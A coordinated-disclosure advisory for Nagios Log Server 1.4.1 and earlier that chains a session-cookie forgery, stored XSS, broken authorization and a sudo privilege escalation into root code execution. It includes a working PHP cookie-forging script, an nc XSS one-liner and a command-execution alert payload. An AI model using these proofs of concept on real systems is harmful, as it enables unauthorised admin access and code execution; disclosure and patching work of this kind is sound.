@@ -1,0 +1,170 @@
+(    , )     (,
+  .   '.' ) ('.    ',
+   ). , ('.   ( ) (
+  (_,) .'), ) _ _,
+ /  _____/  / _  \    ____  ____   _____
+ \____  \==/ /_\  \ _/ ___\/  _ \ /     \
+ /       \/   |    \\  \__(  <_> )  Y Y  \
+/______  /\___|__  / \___  >____/|__|_|  /
+        \/         \/.-.    \/         \/:wq
+                    (x.0)
+                  '=.|w|.='
+                  _=''"''=.
+
+                presents..
+
+Nagios Log Server Multiple Vulnerabilities
+Affected versions: Nagios Log Server <= 1.4.1
+
+PDF:
+http://www.security-assessment.com/files/documents/advisory/NagiosLogServerAdvisory.pdf
+
++-----------+
+|Description|
++-----------+
+The Nagios Log Server application is affected by multiple security
+vulnerabilities, including authentication bypass, stored cross-site
+scripting, inconsistent authorization controls and privilege escalation.
+
+These vulnerabilities can be chained together to obtain unauthenticated
+remote code execution in the context of the root user.
+
+
++------------+
+|Exploitation|
++------------+
+==Authentication Bypass==
+Authentication for the Nagios Log Server web management interface can be
+bypassed due to an insecure implementation of the function validating
+session cookies within the ‘Session.php’ file. As shown below, the
+application uses a base64 encoded serialized PHP string along with a
+SHA1 HMAC checksum as the cookie to authenticate and manage user
+sessions. A sample cookie format is shown below:
+
+a:11:{s:10:"session_id";s:32:"4a6dad39cec8d6a5ef5a1a1d231bf9fa";s:10:"ip_address";s:15:"123.123.123.123";
+s:10:"user_agent";s:72:"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:46.0)
+Gecko/20100101 Firefox/46.0";
+s:13:"last_activity";i:1463700310;s:9:"user_data";s:0:"";s:7:"user_id";s:1:"1";s:8:"username";s:4:"user";
+s:5:"email";s:16:"test@example.com";s:12:"ls_logged_in";i:1;s:10:"apisession";i:1;s:8:"language";s:7:"default";}<SHA1-HMAC-CHECKSUM>
+
+The application relies on the validation against the SHA1 HMAC to
+recognize and destroy invalid session cookies when the checksum value
+does not match. However the encryption key used to generate the HMAC
+checksum is statically set to the SHA1 hash value of the
+$_SERVER['HTTP_HOST'] PHP variable, which is the Host HTTP header value.
+This information can be controlled by the attacker and as such should
+not be considered a secure randomly generated value for the secret
+encryption key.
+
+Since no further verification is performed for other non-predictable
+fields (e.g. session_id, apikey, email, username etc.) and only a valid
+user agent string matching the correct HTTP header value is required, an
+attacker can forge arbitrary session cookies and bypass authentication.
+
+The script on the following page generates session cookies which are
+accepted and validated successfully by the application. A ‘user_id’
+value of 1 can be used to initiate a session in the context of the admin
+user.
+
+[POC - nagiosls_forge_cookie.php]
+<?php
+
+// Usage: php nagiosls_forge_cookie.php [TARGET_IP_ADDRESS/DOMAIN NAME]
+
+$host = $argv[1];
+
+<?php
+
+$host = $argv[1];
+
+$session =
+'a:11:{s:10:"session_id";s:32:"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";s:10:"ip_address";s:15:"123.123.123.123";
+s:10:"user_agent";s:72:"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:46.0)
+Gecko/20100101 Firefox/46.0";s:13:"last_activity";
+i:1463693772;s:9:"user_data";s:0:"";s:7:"user_id";s:1:"1";s:8:"username";s:4:"XXXX";s:5:"email";s:16:"test@example.com";
+s:12:"ls_logged_in";i:1;s:10:"apisession";i:1;s:8:"language";s:7:"default";}';
+
+$encryption_key = sha1($host);
+
+$hmac_check = hash_hmac('sha1', $session, $encryption_key);
+
+$cookie = $session . $hmac_check;
+echo urlencode($cookie);
+
+?>
+
+
+This vulnerability is present across multiple Nagios products.
+
+
+==Stored Cross-Site Scripting==
+The Nagios Log Server application does not validate and HTML encode log
+data sent by configured sources. This issue is aggravated by the fact
+that the application does not maintain a list of authorized log sources,
+but instead accept data from any host connecting to the Nagios Log
+Server port responsible of collecting logs (TCP 5544). An attacker can
+exploit this vulnerability to send malicious JavaScript code and execute
+it in the context of Nagios Log Server user session as shown below.
+
+[POC STORED XSS]
+# echo '<script>alert("xss")</script>' | nc [TARGET IP] 5544
+
+The payload gets rendered under '/nagioslogserver/dashboard'.
+
+==Inconsistent Authorization Controls==
+The Nagios Log Server application provides intended functionality to
+define custom alert commands using different configuration options. By
+default, only administrative users can define alert commands which
+execute scripts on the Log Server filesystem when an alert is triggered.
+
+However, the application does not properly enforce authorization checks
+and an attacker can access the same functionality in the context of a
+standard user session by providing the correct payload in the ‘alert’
+POST parameter. This functionality can be abused to obtain remote code
+execution on the target system as the application does not restrict the
+script definition to a single folder and an attacker can specify
+absolute paths to any script or executable file present on the Log
+Server host.
+
+[POC - CREATE COMMAND EXECUTION ALERT]
+URL => /nagioslogserver/api/check/create/1
+Method => POST
+Payload =>
+alert={"name"%3a"StduserAlertTest","check_interval"%3a"1m","lookback_period"%3a"1m","warning"%3a"1",
+"critical"%3a"1","method"%3a{"type"%3a"exec","path"%3a"/bin/touch",
+"args"%3a"/tmp/STDUSER"},"alert_crit_only"%3a0,"created_by"%3a"stduser","query_id"%3a"AVTLGmd-GYGKrkWMo5Tc"}
+
+
+==Privilege Escalation==
+The default Log Server application sudoers configuration allows the
+‘apache’ user to run the ‘get_logstash_ports.sh’ script as root without
+being prompted for a password. However insecure file write permissions
+have been granted to the 'nagios' group for the ‘get_logstash_ports.sh’
+script file. Since the apache user is a member of the 'nagios' group, an
+attacker can overwrite the script contents with arbitrary data.
+
+Details about the script with insecure permissions are provided below:
+PATH => /usr/local/nagioslogserver/scripts/get_logstash_ports.sh
+PERMISSIONS => rwxrwxr-x nagios nagios
+
+
++----------+
+| Solution |
++----------+
+Upgrade to Nagios Log Server 1.4.2
+
+
++------------+
+|  Timeline  |
++------------+
+2/06/2016 – Initial disclosure to vendor
+3/06/2016 – Vendor acknowledges receipt of advisory
+22/07/2016 – Vendor releases patched software version
+11/08/2016 – Public disclosure
+
+
++------------+
+| Additional |
++------------+
+Further information is available in the accompanying PDF.
+http://www.security-assessment.com/files/documents/advisory/NagiosLogServerAdvisory.pdf
